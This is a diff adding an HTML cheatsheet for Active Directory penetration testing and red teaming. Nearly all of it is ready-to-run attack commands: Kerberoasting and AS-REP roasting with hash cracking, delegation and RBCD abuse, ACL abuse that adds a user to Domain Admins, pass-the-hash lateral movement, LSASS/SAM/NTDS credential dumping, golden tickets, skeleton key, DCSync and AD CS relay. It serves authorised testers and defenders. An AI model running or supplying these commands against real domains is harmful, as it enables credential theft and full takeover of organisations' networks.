@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Active Directory Testing Cheatsheet | maeitsec</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root{--bg-primary:#0a0a0f;--bg-secondary:#12121a;--bg-tertiary:#1a1a24;--accent:#00ff88;--accent-dim:#00cc6a;--accent-glow:rgba(0,255,136,0.15);--text-primary:#e4e4e7;--text-secondary:#a1a1aa;--text-muted:#71717a;--border:#27272a;--red:#ff4757;--yellow:#ffa502;--blue:#3b82f6;--purple:#a855f7;--orange:#f97316}*{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}body{font-family:'Inter',sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.6}nav{position:fixed;top:0;width:100%;padding:1rem 2rem;background:rgba(10,10,15,0.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--border);z-index:1000;display:flex;justify-content:space-between;align-items:center}.logo{font-family:'JetBrains Mono',monospace;font-size:1.25rem;font-weight:700;color:var(--accent);text-decoration:none}.logo span{color:var(--text-primary)}.back-link{color:var(--text-secondary);text-decoration:none;display:flex;align-items:center;gap:0.5rem;font-size:0.9rem}.back-link:hover{color:var(--accent)}.container{max-width:1400px;margin:0 auto;padding:5rem 2rem 3rem;display:grid;grid-template-columns:250px 1fr;gap:3rem}.sidebar{position:sticky;top:5rem;height:fit-content}.sidebar-title{font-size:0.75rem;text-transform:uppercase;letter-spacing:0.1em;color:var(--text-muted);margin-bottom:1rem}.sidebar-nav{list-style:none}.sidebar-nav li{margin-bottom:0.25rem}.sidebar-nav a{display:block;padding:0.5rem 1rem;color:var(--text-secondary);text-decoration:none;font-size:0.9rem;border-left:2px solid transparent;transition:all 0.2s}.sidebar-nav a:hover{color:var(--accent);border-left-color:var(--accent);background:var(--accent-glow)}.content{min-width:0}.page-header{margin-bottom:3rem;padding-bottom:2rem;border-bottom:1px solid var(--border)}.page-header h1{font-size:2.5rem;margin-bottom:0.5rem}.page-header p{color:var(--text-secondary);font-size:1.1rem}.section{margin-bottom:3rem;scroll-margin-top:5rem}.section-title{display:flex;align-items:center;gap:0.75rem;font-size:1.5rem;margin-bottom:1.5rem;color:var(--accent)}.section-title::after{content:'';flex:1;height:1px;background:var(--border)}.code-block{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;margin-bottom:1.5rem;overflow:hidden}.code-header{display:flex;justify-content:space-between;align-items:center;padding:0.75rem 1rem;background:var(--bg-tertiary);border-bottom:1px solid var(--border)}.code-title{font-size:0.85rem;color:var(--text-secondary);font-weight:500}.code-tag{font-size:0.7rem;padding:0.2rem 0.5rem;border-radius:4px;font-family:'JetBrains Mono',monospace}.tag-enum{background:rgba(0,255,136,0.2);color:var(--accent)}.tag-attack{background:rgba(255,71,87,0.2);color:var(--red)}.tag-kerb{background:rgba(168,85,247,0.2);color:var(--purple)}.tag-persist{background:rgba(255,165,2,0.2);color:var(--yellow)}.tag-lateral{background:rgba(59,130,246,0.2);color:var(--blue)}.code-content{padding:1rem;overflow-x:auto}.code-content pre{font-family:'JetBrains Mono',monospace;font-size:0.85rem;line-height:1.6;color:var(--text-primary);white-space:pre-wrap;word-break:break-all}.code-content .comment{color:var(--text-muted)}.copy-btn{background:var(--bg-tertiary);border:1px solid var(--border);color:var(--text-secondary);padding:0.3rem 0.6rem;border-radius:4px;font-size:0.75rem;cursor:pointer}.copy-btn:hover{background:var(--accent);color:var(--bg-primary);border-color:var(--accent)}footer{text-align:center;padding:2rem;border-top:1px solid var(--border);color:var(--text-muted);font-size:0.85rem}@media(max-width:900px){.container{grid-template-columns:1fr;padding-top:4rem}.sidebar{display:none}}
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="../index.html" class="logo">&lt;<span>maeitsec</span>/&gt;</a>
+        <a href="../index.html#cheatsheets" class="back-link">← Back to Cheatsheets</a>
+    </nav>
+
+    <div class="container">
+        <aside class="sidebar">
+            <div class="sidebar-title">On This Page</div>
+            <ul class="sidebar-nav">
+                <li><a href="#enum">Enumeration</a></li>
+                <li><a href="#bloodhound">BloodHound</a></li>
+                <li><a href="#kerberoast">Kerberoasting</a></li>
+                <li><a href="#asrep">AS-REP Roasting</a></li>
+                <li><a href="#delegation">Delegation Attacks</a></li>
+                <li><a href="#acl">ACL Abuse</a></li>
+                <li><a href="#lateral">Lateral Movement</a></li>
+                <li><a href="#creds">Credential Dumping</a></li>
+                <li><a href="#persist">Persistence</a></li>
+                <li><a href="#dcsync">DCSync/DCShadow</a></li>
+                <li><a href="#trusts">Domain Trusts</a></li>
+                <li><a href="#adcs">AD CS Attacks</a></li>
+            </ul>
+        </aside>
+
+        <main class="content">
+            <header class="page-header">
+                <h1>🏢 Active Directory Testing</h1>
+                <p>Comprehensive cheatsheet for Active Directory penetration testing and red team operations.</p>
+            </header>
+
+            <section id="enum" class="section">
+                <h2 class="section-title">🔍 Enumeration</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Domain Enumeration - PowerView</span>
+                        <span class="code-tag tag-enum">Enum</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Import PowerView</span>
+. .\PowerView.ps1
+Import-Module .\PowerView.ps1
+
+<span class="comment"># Domain info</span>
+Get-Domain
+Get-DomainController
+Get-DomainPolicy
+(Get-DomainPolicy)."system access"
+
+<span class="comment"># Users</span>
+Get-DomainUser
+Get-DomainUser -Identity administrator
+Get-DomainUser -Properties samaccountname,description | fl
+Get-DomainUser -SPN  <span class="comment"># Kerberoastable</span>
+Get-DomainUser -PreauthNotRequired  <span class="comment"># AS-REP roastable</span>
+Get-DomainUser -AdminCount  <span class="comment"># Admin users</span>
+
+<span class="comment"># Groups</span>
+Get-DomainGroup | select samaccountname
+Get-DomainGroup -Identity "Domain Admins"
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+<span class="comment"># Computers</span>
+Get-DomainComputer | select dnshostname,operatingsystem
+Get-DomainComputer -Unconstrained  <span class="comment"># Unconstrained delegation</span>
+Get-DomainComputer -TrustedToAuth  <span class="comment"># Constrained delegation</span>
+
+<span class="comment"># Shares</span>
+Find-DomainShare -CheckShareAccess
+Find-InterestingDomainShareFile
+
+<span class="comment"># GPOs</span>
+Get-DomainGPO | select displayname
+Get-DomainGPOLocalGroup  <span class="comment"># GPOs that modify local groups</span>
+
+<span class="comment"># ACLs</span>
+Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
+Find-InterestingDomainAcl -ResolveGUIDs</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Domain Enumeration - Linux</span>
+                        <span class="code-tag tag-enum">Enum</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># ldapsearch</span>
+ldapsearch -x -H ldap://DC01.domain.local -D "user@domain.local" -w 'password' -b "DC=domain,DC=local"
+
+<span class="comment"># Get users</span>
+ldapsearch -x -H ldap://DC01 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
+
+<span class="comment"># Get SPNs (Kerberoastable)</span>
+ldapsearch -x -H ldap://DC01 -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "servicePrincipalName=*"
+
+<span class="comment"># Enum4linux-ng</span>
+enum4linux-ng -A -u 'user' -p 'password' DC01.domain.local
+
+<span class="comment"># CrackMapExec</span>
+crackmapexec smb DC01 -u user -p password --users
+crackmapexec smb DC01 -u user -p password --groups
+crackmapexec smb DC01 -u user -p password --shares
+crackmapexec smb DC01 -u user -p password -M spider_plus
+
+<span class="comment"># Impacket - GetADUsers</span>
+GetADUsers.py -all domain.local/user:password -dc-ip DC01
+
+<span class="comment"># NetExec (successor to CME)</span>
+nxc smb DC01 -u user -p password --users</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="bloodhound" class="section">
+                <h2 class="section-title">🐕 BloodHound</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">BloodHound Collection</span>
+                        <span class="code-tag tag-enum">BloodHound</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># SharpHound (Windows)</span>
+.\SharpHound.exe -c All
+.\SharpHound.exe -c All --zipfilename output.zip
+.\SharpHound.exe -c All,GPOLocalGroup --domain domain.local
+
+<span class="comment"># SharpHound PowerShell</span>
+Import-Module .\SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp
+
+<span class="comment"># bloodhound-python (Linux)</span>
+bloodhound-python -u user -p 'password' -d domain.local -ns DC01 -c All
+bloodhound-python -u user -p 'password' -d domain.local -dc DC01.domain.local -c All
+
+<span class="comment"># With NTLM hash</span>
+bloodhound-python -u user --hashes :NTHASH -d domain.local -dc DC01 -c All
+
+<span class="comment"># Start BloodHound</span>
+sudo neo4j console  <span class="comment"># Start database</span>
+bloodhound  <span class="comment"># Start GUI</span>
+
+<span class="comment"># Key queries:</span>
+<span class="comment"># - Shortest path to Domain Admins</span>
+<span class="comment"># - Find Kerberoastable users</span>
+<span class="comment"># - Find AS-REP roastable users</span>
+<span class="comment"># - Shortest path from owned principals</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="kerberoast" class="section">
+                <h2 class="section-title">🎫 Kerberoasting</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Kerberoasting Attacks</span>
+                        <span class="code-tag tag-kerb">Kerberos</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Rubeus (Windows)</span>
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+.\Rubeus.exe kerberoast /user:svc_sql /outfile:hash.txt
+.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt  <span class="comment"># OPSEC safe</span>
+
+<span class="comment"># Impacket - GetUserSPNs (Linux)</span>
+GetUserSPNs.py domain.local/user:password -dc-ip DC01 -request
+GetUserSPNs.py domain.local/user:password -dc-ip DC01 -request -outputfile hashes.txt
+GetUserSPNs.py domain.local/user -hashes :NTHASH -dc-ip DC01 -request
+
+<span class="comment"># PowerView</span>
+Invoke-Kerberoast -OutputFormat Hashcat | fl
+
+<span class="comment"># Crack with hashcat</span>
+hashcat -m 13100 hashes.txt wordlist.txt
+hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule
+
+<span class="comment"># Crack with john</span>
+john --format=krb5tgs --wordlist=wordlist.txt hashes.txt
+
+<span class="comment"># Targeted Kerberoasting (set SPN on user you control)</span>
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
+<span class="comment"># Then kerberoast that user</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="asrep" class="section">
+                <h2 class="section-title">🔓 AS-REP Roasting</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">AS-REP Roasting Attacks</span>
+                        <span class="code-tag tag-kerb">Kerberos</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Find vulnerable users (DONT_REQ_PREAUTH)</span>
+Get-DomainUser -PreauthNotRequired | select samaccountname
+
+<span class="comment"># Rubeus (Windows)</span>
+.\Rubeus.exe asreproast /outfile:hashes.txt
+.\Rubeus.exe asreproast /user:vulnerable_user /outfile:hash.txt
+
+<span class="comment"># Impacket - GetNPUsers (Linux)</span>
+GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip DC01 -format hashcat
+GetNPUsers.py domain.local/user:password -dc-ip DC01 -request
+GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip DC01
+
+<span class="comment"># Crack with hashcat</span>
+hashcat -m 18200 hashes.txt wordlist.txt
+
+<span class="comment"># Targeted AS-REP Roasting (if you have GenericAll/GenericWrite)</span>
+Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
+<span class="comment"># Now AS-REP roast the user</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="delegation" class="section">
+                <h2 class="section-title">🎭 Delegation Attacks</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Unconstrained Delegation</span>
+                        <span class="code-tag tag-attack">Delegation</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Find unconstrained delegation computers</span>
+Get-DomainComputer -Unconstrained | select dnshostname
+Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+
+<span class="comment"># Monitor for TGTs with Rubeus</span>
+.\Rubeus.exe monitor /interval:5 /filteruser:DC01$
+
+<span class="comment"># Coerce authentication (PrinterBug/PetitPotam)</span>
+SpoolSample.exe DC01 YOURCOMPUTER
+python3 PetitPotam.py YOURCOMPUTER DC01
+
+<span class="comment"># Export captured TGT</span>
+.\Rubeus.exe ptt /ticket:base64ticket
+
+<span class="comment"># DCSync with captured DC ticket</span>
+mimikatz # lsadump::dcsync /domain:domain.local /user:administrator</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Constrained Delegation</span>
+                        <span class="code-tag tag-attack">Delegation</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Find constrained delegation</span>
+Get-DomainComputer -TrustedToAuth | select dnshostname,msds-allowedtodelegateto
+Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
+
+<span class="comment"># Rubeus - S4U attack (with password/hash)</span>
+.\Rubeus.exe s4u /user:svc_sql /rc4:NTHASH /impersonateuser:administrator /msdsspn:cifs/DC01.domain.local /ptt
+
+<span class="comment"># Rubeus - S4U with aes key</span>
+.\Rubeus.exe s4u /user:svc_sql /aes256:AESKEY /impersonateuser:administrator /msdsspn:cifs/DC01 /altservice:ldap /ptt
+
+<span class="comment"># Impacket - getST</span>
+getST.py -spn cifs/DC01.domain.local -impersonate administrator domain.local/svc_sql:password
+getST.py -spn cifs/DC01.domain.local -impersonate administrator -hashes :NTHASH domain.local/svc_sql
+
+<span class="comment"># Use ticket</span>
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass domain.local/administrator@DC01</pre>
+                    </div>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Resource-Based Constrained Delegation (RBCD)</span>
+                        <span class="code-tag tag-attack">Delegation</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Requirements: Write privilege to msDS-AllowedToActOnBehalfOfOtherIdentity</span>
+
+<span class="comment"># Create computer account (if MachineAccountQuota > 0)</span>
+Powermad: New-MachineAccount -MachineAccount YOURPC -Password $(ConvertTo-SecureString 'Password1!' -AsPlainText -Force)
+impacket: addcomputer.py domain.local/user:password -computer-name 'YOURPC$' -computer-pass 'Password1!'
+
+<span class="comment"># Set RBCD</span>
+Set-ADComputer TARGET$ -PrincipalsAllowedToDelegateToAccount YOURPC$
+
+<span class="comment"># PowerView</span>
+$sid = Get-DomainComputer YOURPC -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
+Set-DomainObject TARGET$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SD.GetBinaryForm()}
+
+<span class="comment"># Get ticket</span>
+getST.py -spn cifs/TARGET.domain.local -impersonate administrator -dc-ip DC01 'domain.local/YOURPC$:Password1!'
+
+<span class="comment"># Use ticket</span>
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass TARGET.domain.local</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="acl" class="section">
+                <h2 class="section-title">🔑 ACL Abuse</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">ACL-Based Attacks</span>
+                        <span class="code-tag tag-attack">ACL</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># GenericAll on User - Reset password</span>
+net user targetuser NewPassword123! /domain
+Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)
+
+<span class="comment"># GenericAll on User - Targeted Kerberoasting</span>
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
+
+<span class="comment"># GenericAll on Group - Add yourself</span>
+Add-DomainGroupMember -Identity "Domain Admins" -Members youruser
+net group "Domain Admins" youruser /add /domain
+
+<span class="comment"># GenericWrite - Targeted Kerberoasting</span>
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
+
+<span class="comment"># GenericWrite - Shadow Credentials (if DC supports)</span>
+Whisker.exe add /target:targetuser
+
+<span class="comment"># WriteDacl - Grant yourself GenericAll</span>
+Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity youruser -Rights All
+
+<span class="comment"># WriteOwner - Take ownership then WriteDacl</span>
+Set-DomainObjectOwner -Identity targetobject -OwnerIdentity youruser
+
+<span class="comment"># ForceChangePassword</span>
+Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)
+
+<span class="comment"># DCSync rights (Replicating Directory Changes)</span>
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity youruser -Rights DCSync</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="lateral" class="section">
+                <h2 class="section-title">➡️ Lateral Movement</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Lateral Movement Techniques</span>
+                        <span class="code-tag tag-lateral">Lateral</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># PSExec</span>
+psexec.py domain.local/administrator:password@TARGET
+psexec.py -hashes :NTHASH domain.local/administrator@TARGET
+
+<span class="comment"># WMIExec</span>
+wmiexec.py domain.local/administrator:password@TARGET
+wmiexec.py -hashes :NTHASH domain.local/administrator@TARGET
+
+<span class="comment"># SMBExec</span>
+smbexec.py domain.local/administrator:password@TARGET
+
+<span class="comment"># ATExec</span>
+atexec.py domain.local/administrator:password@TARGET "whoami"
+
+<span class="comment"># Evil-WinRM</span>
+evil-winrm -i TARGET -u administrator -p password
+evil-winrm -i TARGET -u administrator -H NTHASH
+
+<span class="comment"># CrackMapExec execution</span>
+crackmapexec smb TARGET -u admin -p password -x "whoami"
+crackmapexec smb TARGET -u admin -H NTHASH -x "whoami"
+crackmapexec winrm TARGET -u admin -p password -x "whoami"
+
+<span class="comment"># Pass-the-Hash (Windows)</span>
+mimikatz # sekurlsa::pth /user:administrator /domain:domain.local /ntlm:NTHASH
+
+<span class="comment"># Pass-the-Ticket</span>
+.\Rubeus.exe ptt /ticket:base64ticket
+mimikatz # kerberos::ptt ticket.kirbi
+
+<span class="comment"># Overpass-the-Hash</span>
+.\Rubeus.exe asktgt /user:administrator /rc4:NTHASH /ptt</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="creds" class="section">
+                <h2 class="section-title">🔐 Credential Dumping</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Credential Extraction</span>
+                        <span class="code-tag tag-attack">Creds</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Mimikatz - Dump creds from memory</span>
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::wdigest
+mimikatz # sekurlsa::tickets /export
+
+<span class="comment"># Mimikatz - Dump SAM</span>
+mimikatz # lsadump::sam
+
+<span class="comment"># Mimikatz - Dump LSASS</span>
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+
+<span class="comment"># Dump LSASS with comsvcs.dll</span>
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full
+
+<span class="comment"># Dump SAM/SYSTEM/SECURITY</span>
+reg save HKLM\SAM sam.save
+reg save HKLM\SYSTEM system.save
+reg save HKLM\SECURITY security.save
+secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+
+<span class="comment"># Remote credential dump</span>
+secretsdump.py domain.local/administrator:password@TARGET
+secretsdump.py -hashes :NTHASH domain.local/administrator@TARGET
+
+<span class="comment"># CrackMapExec</span>
+crackmapexec smb TARGET -u admin -p password --sam
+crackmapexec smb TARGET -u admin -p password --lsa
+crackmapexec smb TARGET -u admin -p password --ntds  <span class="comment"># On DC</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="persist" class="section">
+                <h2 class="section-title">⚓ Persistence</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Domain Persistence</span>
+                        <span class="code-tag tag-persist">Persist</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Golden Ticket</span>
+mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
+mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:NTHASH /ptt
+
+<span class="comment"># Silver Ticket</span>
+mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /target:TARGET /service:cifs /rc4:MACHINE_NTHASH /ptt
+
+<span class="comment"># Skeleton Key</span>
+mimikatz # privilege::debug
+mimikatz # misc::skeleton
+<span class="comment"># Now "mimikatz" works as password for any user</span>
+
+<span class="comment"># AdminSDHolder Persistence</span>
+Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity youruser -Rights All
+<span class="comment"># Wait for SDProp (60 min default) or force:</span>
+Invoke-ADSDPropagation
+
+<span class="comment"># DSRM Password</span>
+mimikatz # lsadump::lsa /patch  <span class="comment"># Get DSRM hash from DC</span>
+<span class="comment"># Enable network logon: Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DsrmAdminLogonBehavior -Value 2</span>
+
+<span class="comment"># Custom SSP</span>
+mimikatz # misc::memssp  <span class="comment"># Logs creds to C:\Windows\System32\mimilsa.log</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="dcsync" class="section">
+                <h2 class="section-title">🔄 DCSync / DCShadow</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">DCSync Attack</span>
+                        <span class="code-tag tag-attack">DCSync</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Requirements: Replicating Directory Changes + Replicating Directory Changes All</span>
+<span class="comment"># Default: Domain Admins, Enterprise Admins, Administrators, DCs</span>
+
+<span class="comment"># Mimikatz</span>
+mimikatz # lsadump::dcsync /domain:domain.local /user:administrator
+mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
+mimikatz # lsadump::dcsync /domain:domain.local /all /csv
+
+<span class="comment"># Impacket</span>
+secretsdump.py domain.local/admin:password@DC01 -just-dc
+secretsdump.py domain.local/admin:password@DC01 -just-dc-user administrator
+secretsdump.py domain.local/admin:password@DC01 -just-dc-user krbtgt
+secretsdump.py -hashes :NTHASH domain.local/admin@DC01 -just-dc-ntlm
+
+<span class="comment"># Grant DCSync rights (if you have WriteDacl)</span>
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity youruser -Rights DCSync</pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="trusts" class="section">
+                <h2 class="section-title">🌐 Domain Trusts</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Trust Enumeration & Attacks</span>
+                        <span class="code-tag tag-enum">Trusts</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Enumerate trusts</span>
+Get-DomainTrust
+Get-DomainTrust -Domain parent.local
+nltest /domain_trusts
+
+<span class="comment"># Parent-Child Trust (SID History)</span>
+<span class="comment"># Get child domain krbtgt hash</span>
+mimikatz # lsadump::dcsync /domain:child.parent.local /user:krbtgt
+
+<span class="comment"># Get parent domain SID</span>
+Get-DomainSID -Domain parent.local
+
+<span class="comment"># Create Golden Ticket with Enterprise Admin SID</span>
+mimikatz # kerberos::golden /user:fakeadmin /domain:child.parent.local /sid:CHILD_SID /krbtgt:KRBTGT_HASH /sids:PARENT_SID-519 /ptt
+<span class="comment"># -519 = Enterprise Admins</span>
+
+<span class="comment"># Forest Trust (if SID filtering disabled)</span>
+<span class="comment"># Same technique but across forests</span>
+
+<span class="comment"># Trust key exploitation</span>
+mimikatz # lsadump::trust /patch  <span class="comment"># Get trust keys</span>
+<span class="comment"># Create inter-realm TGT</span></pre>
+                    </div>
+                </div>
+            </section>
+
+            <section id="adcs" class="section">
+                <h2 class="section-title">📜 AD CS Attacks</h2>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span class="code-title">Certificate Services Attacks</span>
+                        <span class="code-tag tag-attack">AD CS</span>
+                    </div>
+                    <div class="code-content">
+<pre><span class="comment"># Enumerate AD CS</span>
+Certify.exe find
+Certify.exe find /vulnerable
+
+<span class="comment"># certipy (Linux)</span>
+certipy find -u user@domain.local -p password -dc-ip DC01
+certipy find -u user@domain.local -p password -dc-ip DC01 -vulnerable
+
+<span class="comment"># ESC1 - Misconfigured Certificate Templates</span>
+<span class="comment"># Allows requester to specify SAN (Subject Alternative Name)</span>
+Certify.exe request /ca:CA01\CA /template:VulnTemplate /altname:administrator
+certipy req -u user@domain.local -p password -ca CA01-CA -template VulnTemplate -upn administrator@domain.local
+
+<span class="comment"># ESC4 - Vulnerable Certificate Template ACL</span>
+<span class="comment"># Modify template to be vulnerable to ESC1</span>
+
+<span class="comment"># ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2</span>
+<span class="comment"># CA allows SAN in any request</span>
+
+<span class="comment"># ESC8 - Web Enrollment NTLM Relay</span>
+<span class="comment"># Relay to http://CA/certsrv/certfnsh.asp</span>
+ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+<span class="comment"># Convert PFX to ticket</span>
+certipy auth -pfx administrator.pfx -dc-ip DC01
+
+<span class="comment"># Use with Rubeus</span>
+Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password /ptt</pre>
+                    </div>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <footer>
+        <p>&lt;maeitsec/&gt; | Active Directory Testing Cheatsheet</p>
+    </footer>
+
+    <script>
+        function copyCode(btn){const block=btn.closest('.code-block');const code=block.querySelector('pre').textContent;navigator.clipboard.writeText(code);btn.textContent='Copied!';setTimeout(()=>btn.textContent='Copy',2000);}
+    </script>
+</body>
+</html>
